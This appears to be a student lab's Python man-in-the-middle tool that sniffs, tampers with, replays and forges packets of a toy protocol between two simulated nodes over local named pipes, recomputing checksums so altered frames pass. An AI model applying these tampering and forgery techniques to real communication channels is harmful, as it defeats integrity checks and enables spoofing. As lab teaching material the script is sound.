#!/usr/bin/env python3

import os
import sys
import struct
import binascii
import time
import argparse

PIPE_IN = "/tmp/nodeA_to_attacker"
PIPE_OUT = "/tmp/attacker_to_nodeB"

PACKET_FORMAT = '<IBBBxH256sHI'
PACKET_SIZE = struct.calcsize(PACKET_FORMAT)  # Evaluates to exactly 272 bytes


class MitmOrchestrator:
    def __init__(self, mode, target_str=None, replace_str=None, inject_msg=None):
        self.mode = mode
        self.target_str = target_str
        self.replace_str = replace_str
        self.inject_msg = inject_msg
        self.replay_cache = [] 

    def compute_crc32(self, data_bytes):
        """Computes unsigned 32-bit CRC checksum for logging telemetry."""
        return binascii.crc32(data_bytes) & 0xFFFFFFFF

    def compute_arithmetic_checksum(self, payload_bytes, length):
        """Computes 16-bit arithmetic sum checksum matching sender.c logic."""
        checksum = 0
        for i in range(min(length, len(payload_bytes))):
            checksum += payload_bytes[i]
        return checksum & 0xFFFF

    def read_exact(self, fd, n):
        """Ensures exact extraction of byte structures over streaming named pipes."""
        buffer = b''
        while len(buffer) < n:
            chunk = os.read(fd, n - len(buffer))
            if not chunk:
                return buffer  # End of stream handled by caller
            buffer += chunk
        return buffer

    def run(self):
        """Launches the primary pipeline processing engine."""
        if self.mode == "inject":
            self.execute_standalone_injection()
            return

        print(f"[*] Initializing Active Intercept Layer. Strategy: [{self.mode.upper()}]")
        
        if not os.path.exists(PIPE_IN) or not os.path.exists(PIPE_OUT):
            print("[-] Infrastructure Error: Named pipes missing.")
            sys.exit(1)

        print("[*] Opening Channel Read Target (Listening to Node A)...")
        fd_in = os.open(PIPE_IN, os.O_RDONLY)
        
        print("[*] Opening Channel Write Target (Forwarding to Node B)...")
        fd_out = os.open(PIPE_OUT, os.O_WRONLY)
        
        print("[+] Proxy routing channels engaged seamlessly.\n")

        while True:
            try:
                raw_packet = self.read_exact(fd_in, PACKET_SIZE)
                
                if not raw_packet or len(raw_packet) < PACKET_SIZE:
                    print("[*] Stream terminated by Sender. Awaiting reconnection context...")
                    os.close(fd_in)
                    fd_in = os.open(PIPE_IN, os.O_RDONLY)
                    continue

                magic, src_id, dest_id, packet_type, payload_len, raw_payload, packet_checksum, seq = struct.unpack(PACKET_FORMAT, raw_packet)

                cleartext_payload = raw_payload[:payload_len].decode('utf-8', errors='ignore')
                crc = self.compute_crc32(raw_payload[:payload_len])

                print("\033[94m" + "="*60)
                print(f"[INTERCEPTED FRAME] Sequence Index: {seq}")
                print(f"  ├── Magic Identifier : {hex(magic).upper()}")
                print(f"  ├── Source Node ID   : {src_id}")
                print(f"  ├── Destination ID   : {dest_id}")
                print(f"  ├── Packet Type Tag  : {packet_type}")
                print(f"  ├── Captured Data    : \"{cleartext_payload}\" ({payload_len} Bytes)")
                print(f"  ├── Payload Checksum : {packet_checksum}")
                print(f"  └── Telemetry CRC32  : {hex(crc).upper()}")
                print("="*60 + "\033[0m")

                if self.mode == "replay":
                    self.replay_cache.append(raw_packet)
                    print(f"[+] Replay Subsystem: Cached valid 272-byte structural frame.")

                if self.mode == "tamper" and self.target_str and self.replace_str:
                    if self.target_str in cleartext_payload:
                        print(f"\n\033[91m[!] CRITICAL: Found match for target query token: '{self.target_str}'")
                        
                        cleartext_payload = cleartext_payload.replace(self.target_str, self.replace_str)
                        new_payload_bytes = cleartext_payload.encode('utf-8', errors='ignore')
                        
                        payload_len = min(len(new_payload_bytes), 256)
                        padded_payload = new_payload_bytes[:256].ljust(256, b'\x00')
                        
                        # Recalculate structural math checksums dynamically
                        packet_checksum = self.compute_arithmetic_checksum(padded_payload, payload_len)
                        
                        raw_packet = struct.pack(PACKET_FORMAT, magic, src_id, dest_id, packet_type, payload_len, padded_payload, packet_checksum, seq)
                        
                        print(f"  ├── Mutator: Swapped cleartext with string: \"{cleartext_payload}\"")
                        print(f"  ├── Checksum Re-gen: Generated new hash constraint value: {packet_checksum}")
                        print(f"  └── Structure Pack: Synthesized updated 272-byte frame stream.\033[0m\n")

                os.write(fd_out, raw_packet)

                if self.mode == "replay" and len(self.replay_cache) > 0:
                    time.sleep(2)  # Delay injection footprints by two seconds
                    print("\n\033[33m[!] REPLAY ATTACK EXECUTION: Re-injecting historical state frame...")
                    os.write(fd_out, self.replay_cache[0])
                    print("    └── [SUCCESS] Duplicate sequence packet pushed to Node B.\033[0m\n")
                    self.replay_cache.clear()

            except KeyboardInterrupt:
                print("\n[*] Intercept routine terminated cleanly.")
                break

        os.close(fd_in)
        os.close(fd_out)

    def execute_standalone_injection(self):
        """ATTACK CLASS 4: FORGED PACKET INJECTION"""
        print(f"[*] Initializing Forged Packet Injection Engine...")
        print(f"[*] Bypassing Node A entirely. Establishing target channel access link...")
        
        try:
            fd_out = os.open(PIPE_OUT, os.O_WRONLY)
            
            fake_magic = 0xABCD1234 
            fake_src = 1
            fake_dest = 2
            fake_type = 1          
            fake_seq = 1337         
            
            new_payload_bytes = self.inject_msg.encode('utf-8', errors='ignore')
            payload_len = min(len(new_payload_bytes), 256)
            padded_payload = new_payload_bytes[:256].ljust(256, b'\x00')
            
            fake_checksum = self.compute_arithmetic_checksum(padded_payload, payload_len)
            
            packet = struct.pack(PACKET_FORMAT, fake_magic, fake_src, fake_dest, fake_type, payload_len, padded_payload, fake_checksum, fake_seq)
            
            print("\n\033[95m" + "!"*60)
            print(f"[PACKET FORGERY DISPATCHED] Sending Unauthorized Structural Payload")
            print(f"  ├── Forged Message Body : \"{self.inject_msg}\"")
            print(f"  ├── Forged Checksum     : {fake_checksum}")
            print(f"  └── Total Outflow Frame : {len(packet)} Bytes Packed")
            print("!"*60 + "\033[0m\n")
            
            os.write(fd_out, packet)
            os.close(fd_out)
            
        except Exception as e:
            print(f"[-] Critical injection processing crash occurred: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IITI SOC 2026 Track 3 Cyber Engine")
    parser.add_argument('--mode', choices=['sniff', 'tamper', 'replay', 'inject'], required=True)
    parser.add_argument('--target', type=str, help="Target keyword to match during tampering loops.")
    parser.add_argument('--replace', type=str, help="Replacement text to write over target entries.")
    parser.add_argument('--message', type=str, default="HELLO FROM NODE A", help="Data block payload for injection runs.")
    
    args = parser.parse_args()
    engine = MitmOrchestrator(mode=args.mode, target_str=args.target, replace_str=args.replace, inject_msg=args.message)
    engine.run()
